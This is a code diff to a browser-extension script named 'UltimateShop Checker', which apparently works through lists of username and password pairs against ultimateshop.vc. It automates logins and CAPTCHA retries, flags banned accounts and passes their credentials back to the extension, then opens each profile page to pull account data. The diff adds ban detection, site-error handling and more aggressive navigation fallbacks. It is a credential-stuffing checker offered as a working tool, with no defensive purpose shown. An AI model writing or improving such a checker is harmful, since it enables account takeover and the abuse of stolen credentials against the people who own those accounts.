@@ -1,4 +1,4 @@
-// UltimateShop Checker - Final Version (Multiple Tabs Support)
+// UltimateShop Checker - Enhanced Version (Multiple Tabs Support)
 // Function to generate a random delay between 1 and 3 seconds
 function getRandomDelay() {
     return Math.floor(Math.random() * 2000) + 1000; // 1000 to 3000 ms
@@ -57,14 +57,26 @@ function isLoginPage() {
            document.querySelector('#LoginForm_username');
 }
 
-// Check if we're on the success page (after login)
+// Check if we're on the success page (after login) - Enhanced detection
 function isSuccessPage() {
-    // Simple working method: check for /news URL + "Discount :" text
+    // Multiple success indicators for better detection
     const hasNewsUrl = window.location.href.includes('/news');
     const hasDiscountText = document.body.innerText.includes('Discount :');
+    const hasShopRules = document.querySelector('h4.modal-title#myLargeModalLabel') && 
+                        document.querySelector('h4.modal-title#myLargeModalLabel').textContent.includes('Shop Rules');
     
-    if (hasNewsUrl && hasDiscountText) {
-        console.log('UltimateShop Checker: SUCCESS KEY FOUND: /news + "Discount :" detected!');
+    // Check for any success indicator
+    if (hasNewsUrl && (hasDiscountText || hasShopRules)) {
+        console.log('UltimateShop Checker: SUCCESS KEY FOUND!');
+        console.log('UltimateShop Checker: URL check:', hasNewsUrl);
+        console.log('UltimateShop Checker: Discount text check:', hasDiscountText);
+        console.log('UltimateShop Checker: Shop rules check:', hasShopRules);
+        return true;
+    }
+    
+    // Additional check: if we're on news page with any meaningful content
+    if (hasNewsUrl && document.body.innerText.length > 1000) {
+        console.log('UltimateShop Checker: SUCCESS DETECTED: News page with content');
         return true;
     }
     
@@ -134,10 +146,84 @@ function extractProfileData() {
     }
 }
 
-// Navigate to profile page
+// Navigate to profile page with multiple fallback methods
 function navigateToProfile() {
     console.log('UltimateShop Checker: Navigating to profile page...');
-    window.location.href = 'https://ultimateshop.vc/profile';
+    
+    // Method 1: Direct navigation
+    try {
+        window.location.href = 'https://ultimateshop.vc/profile';
+        console.log('UltimateShop Checker: Direct navigation attempted');
+    } catch (error) {
+        console.error('UltimateShop Checker: Direct navigation failed:', error);
+        
+        // Method 2: Try clicking profile link if available
+        const profileLink = document.querySelector('a[href="/profile"]') || 
+                           document.querySelector('a[href*="profile"]') ||
+                           document.querySelector('a:contains("Profile")');
+        
+        if (profileLink) {
+            console.log('UltimateShop Checker: Found profile link, clicking...');
+            profileLink.click();
+        } else {
+            // Method 3: Use window.location.replace
+            console.log('UltimateShop Checker: Using window.location.replace...');
+            window.location.replace('https://ultimateshop.vc/profile');
+        }
+    }
+}
+
+// Enhanced navigation with monitoring
+function navigateToProfileWithMonitoring() {
+    console.log('UltimateShop Checker: Starting enhanced navigation to profile...');
+    
+    // Set a flag to track navigation
+    sessionStorage.setItem('navigating_to_profile', 'true');
+    
+    // Start navigation
+    navigateToProfile();
+    
+    // Monitor if navigation was successful
+    let navigationAttempts = 0;
+    const maxNavigationAttempts = 5;
+    
+    const navigationMonitor = setInterval(() => {
+        navigationAttempts++;
+        console.log(`UltimateShop Checker: Navigation monitor attempt ${navigationAttempts}/${maxNavigationAttempts}`);
+        
+        // Check if we're on profile page
+        if (window.location.href.includes('/profile')) {
+            console.log('UltimateShop Checker: Successfully reached profile page!');
+            clearInterval(navigationMonitor);
+            sessionStorage.removeItem('navigating_to_profile');
+            return;
+        }
+        
+        // If max attempts reached, try alternative methods
+        if (navigationAttempts >= maxNavigationAttempts) {
+            console.log('UltimateShop Checker: Max navigation attempts reached, trying alternative methods...');
+            clearInterval(navigationMonitor);
+            
+            // Try multiple alternative navigation methods
+            try {
+                // Method 1: Force navigation with reload
+                window.location.href = 'https://ultimateshop.vc/profile';
+                setTimeout(() => {
+                    if (!window.location.href.includes('/profile')) {
+                        // Method 2: Try with window.open
+                        console.log('UltimateShop Checker: Trying window.open method...');
+                        window.open('https://ultimateshop.vc/profile', '_self');
+                    }
+                }, 2000);
+            } catch (error) {
+                console.error('UltimateShop Checker: All navigation methods failed:', error);
+                // Last resort: refresh and try again
+                setTimeout(() => {
+                    window.location.reload();
+                }, 3000);
+            }
+        }
+    }, 1000);
 }
 
 // Wait for CAPTCHA image to appear with retry mechanism
@@ -366,7 +452,7 @@ async function performLoginAutomation() {
     }
 }
 
-// Get the error message from the page
+// Get the error message from the page - Enhanced detection
 function getErrorMessage() {
     const errorElements = document.querySelectorAll('.alert, .error, .text-danger, .help-block');
     
@@ -377,7 +463,17 @@ function getErrorMessage() {
             return 'Incorrect username or password';
         } else if (text.includes('The verification code is incorrect')) {
             return 'The verification code is incorrect';
+        } else if (text.includes('BANNED') || text.includes('banned') || text.includes('Banned')) {
+            return 'BANNED';
+        } else if (text.includes('confirm') || text.includes('maintenance')) {
+            return 'SITE_ISSUE';
         }
+    }
+    
+    // Also check body text for BANNED
+    const bodyText = document.body.innerText;
+    if (bodyText.includes('BANNED') || bodyText.includes('banned') || bodyText.includes('Banned')) {
+        return 'BANNED';
     }
     
     return null;
@@ -392,7 +488,38 @@ function handlePage() {
         
         const error = getErrorMessage();
         if (error) {
-            if (error === 'The verification code is incorrect') {
+            if (error === 'BANNED') {
+                console.log('UltimateShop Checker: Account BANNED, skipping...');
+                
+                // Report as BANNED
+                const username = sessionStorage.getItem('current_username');
+                const password = sessionStorage.getItem('current_password');
+                if (username && password) {
+                    chrome.runtime.sendMessage({
+                        type: 'banned_detected',
+                        username,
+                        password
+                    });
+                    sessionStorage.removeItem('current_username');
+                    sessionStorage.removeItem('current_password');
+                }
+                
+                // Clear form and refresh for next account
+                clearLoginForm();
+                setTimeout(() => {
+                    window.location.reload();
+                }, 2000);
+                
+            } else if (error === 'SITE_ISSUE') {
+                console.log('UltimateShop Checker: Site issue detected, refreshing...');
+                
+                // Refresh to resolve site issue
+                setTimeout(() => {
+                    console.log('UltimateShop Checker: Refreshing tab to resolve site issue...');
+                    window.location.reload();
+                }, 2000);
+                
+            } else if (error === 'The verification code is incorrect') {
                 console.log('UltimateShop Checker: CAPTCHA incorrect, attempt:', captchaRetryCount + 1, 'of', MAX_CAPTCHA_RETRIES);
                 
                 // Check if we've exceeded max retries
@@ -480,9 +607,37 @@ function handlePage() {
         // Clear the checking flag
         isChecking = false;
         
-        // Simple navigation: wait 2 seconds then go to profile
-        console.log('UltimateShop Checker: Waiting 2 seconds then navigating to profile...');
-        setTimeout(navigateToProfile, 2000);
+        // Try multiple navigation methods with aggressive approach
+        console.log('UltimateShop Checker: Using enhanced navigation methods...');
+        
+        // Method 1: Enhanced navigation with monitoring
+        setTimeout(() => {
+            navigateToProfileWithMonitoring();
+        }, 1500);
+        
+        // Method 2: Backup navigation after delay
+        setTimeout(() => {
+            if (!window.location.href.includes('/profile')) {
+                console.log('UltimateShop Checker: Backup navigation method...');
+                window.location.href = 'https://ultimateshop.vc/profile';
+            }
+        }, 4000);
+        
+        // Method 3: Force navigation after longer delay
+        setTimeout(() => {
+            if (!window.location.href.includes('/profile')) {
+                console.log('UltimateShop Checker: Force navigation method...');
+                window.location.replace('https://ultimateshop.vc/profile');
+            }
+        }, 6000);
+        
+        // Method 4: Last resort - refresh and try again
+        setTimeout(() => {
+            if (!window.location.href.includes('/profile')) {
+                console.log('UltimateShop Checker: Last resort - refreshing page...');
+                window.location.reload();
+            }
+        }, 8000);
         
     } else if (isProfilePage()) {
         console.log('UltimateShop Checker: On profile page, extracting data...');
